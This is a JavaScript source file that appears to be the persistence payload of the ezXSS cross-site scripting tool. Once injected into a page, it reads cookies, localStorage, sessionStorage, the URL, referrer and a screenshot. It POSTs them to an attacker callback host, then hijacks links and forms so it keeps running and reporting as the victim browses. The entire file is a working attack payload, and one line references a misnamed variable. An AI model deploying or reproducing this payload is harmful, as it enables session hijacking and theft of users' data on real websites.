function ra_n(e) {
    return void 0 !== e ? e : ""
}

var pi;
var last = '';

function ping() {
    try {
        console.log(JSON.stringify({ 'action': 'ping' }));
        pi = setTimeout(ping, 30000);
    } catch (e) {
        init()
    }
}

function init() {
    // Ready to persist
    ra_hL();
    ra_cb(ra_rD);
}

function ra_cb(e) { var t = new XMLHttpRequest; t.open("POST", "https://{{domain}}/callback", !0), t.setRequestHeader("Content-type", "text/plain"), t.onreadystatechange = function () { 4 == t.readyState && t.status }, t.send(JSON.stringify(e)) }

function ra_first() {
    init();
}

function ra_client() {
    var name = "ezXSS=";
    var cookies = document.cookie.split(';');
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        if (cookie.indexOf(name) == 0) {
            return cookie.substring(name.length, cookie.length);
        }
    }
    var value = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < 15; i++) {
        value += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    var expires = new Date();
    expires.setFullYear(expires.getFullYear() + 1);
    document.cookie = name + value + ";expires=" + expires.toUTCString() + ";path=/";
    return value;
}

function ra_hL() {
    try {
        ra_rD.clientid = ra_client()
    } catch (e) {
        ra_rD.clientid = ""
    }
    try {
        ra_rD.method = "persist"
    } catch (e) {
        ra_rD.method = ""
    }
    try{ez_rD.payload="{%data payload}"}catch(e){ez_rD.payload=""}
    try {
        ra_rD.uri = ra_n(location.toString())
    } catch (e) {
        ra_rD.uri = ""
    }
    try {
        ra_rD.cookies = ra_n(document.cookie)
    } catch (e) {
        ra_rD.cookies = ""
    }
    try {
        if(last != '') {
            ra_rD.referer = ra_n(last)
        } else {
            ra_rD.referer = ra_n(document.referrer)
        }
    } catch (e) {
        ra_rD.referer = ""
    }
    try {
        ra_rD["user-agent"] = ra_n(navigator.userAgent)
    } catch (e) {
        ra_rD["user-agent"] = ""
    }
    try {
        ra_rD.origin = ra_n(location.origin)
    } catch (e) {
        ra_rD.origin = ""
    }
    try {
        ra_rD.localstorage = ra_n(window.localStorage);
    } catch (e) {
        ra_rD.localstorage = "";
    }
    try {
        ra_rD.sessionstorage = ra_n(window.sessionStorage);
    } catch (e) {
        ra_rD.sessionstorage = "";
    }
    try {
        ra_rD.dom = ""; //ra_n(document.documentElement.outerHTML)
    } catch (e) {
        ra_rD.dom = ""
    }
    try {
        html2canvas(document.body).then(function (e) {
            ra_rD.screenshot = ra_n(e.toDataURL()), ra_c();
        });
    } catch (e) {
        ra_rD.screenshot = "", ra_c()
    }

    function ra_c() {
        ra_r()
    }
}

function ra_aE(e, t, n) {
    e.addEventListener ? e.addEventListener(t, n, !1) : e.attachEvent && e.attachEvent("on" + t, n)
}

ra_rD = {}, "complete" == document.readyState ? ra_first() : ra_aE(window, "load", function () {
    ra_first()
});

function ra_r() {
    document.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            let paths = e.path;
            var linkFound = false;
            for (path in paths) {
                for (subpath in path) {
                    if (paths[path].nodeName === 'A') {

                        console.log('A link with target URL ' + paths[path].href + ' was clicked');

                        if (paths[path].hostname === window.location.hostname) {
                            if (paths[path].href.slice(-1) === '#' && paths[path].hash === '') {
                                break;
                            }

                            // Same page click
                            if (paths[path].hash !== "" && paths[path].href.replace(paths[path].hash, '') === window.location.href.split('#')[0]) {
                                var hash = paths[path].hash.replace('#', '');
                                var top = document.getElementById(hash).offsetTop;
                                window.history.pushState("", document.title, paths[path].href);
                                window.scrollTo(0, top);
                                linkFound = true;
                                break;
                            }

                            // Page click on same domain
                            var request = new XMLHttpRequest();
                            request.onload = function () {
                                if (this.readyState == 4) {
                                    last = ra_n(location.toString());
                                    document.getElementsByTagName("html")[0].innerHTML = this.responseText;
                                    window.scrollTo(0, 0);
                                    let title = this.responseText.match(/<title[^>]*>([^<]+)<\/title>/)[1];
                                    document.title = title;
                                    window.history.pushState({ "html": this.responseText, "pageTitle": title }, "", paths[path].href);

                                    let scripts = Array.from(this.responseText.matchAll(/<script[^>]*src=[^>]*>[^>]*<\/script>/g));
                                    for (script in scripts) {
                                        try {
                                            var search = /<script[^>]+src="([^">]+)"/g;
                                            var src = search.exec(scripts[script][0])[1];
                                            var a = document.createElement('script');
                                            a.src = src;
                                            document.body.appendChild(a);
                                        } catch (e) { }
                                    }
                                    init();
                                }
                            };

                            request.onerror = function () {
                                window.open(paths[path].href, '_blank').focus();
                            };

                            request.open('GET', paths[path].href);
                            request.send();
                        } else {
                            // Click to other domain
                            window.open(paths[path].href, '_blank').focus();
                        }
                        linkFound = true;
                        break;
                    }
                }
                if (linkFound) break;
            }
        });
    });

    document.querySelectorAll("form").forEach(form => {
        form.addEventListener("submit", event => {
            event.preventDefault(); // prevent the form from redirecting or refreshing the page
            const formData = new FormData(form); // get all data from the form
            const xhr = new XMLHttpRequest();
            xhr.open("POST", form.action);
            xhr.onload = () => {
                if (xhr.status === 200) {
                    console.log('yes!');
                    document.documentElement.innerHTML = xhr.response;


                    console.log('done!');
                } else {
                    alert("An error occurred while processing the form.");
                }
            };
            xhr.send(formData);
        });
    });
}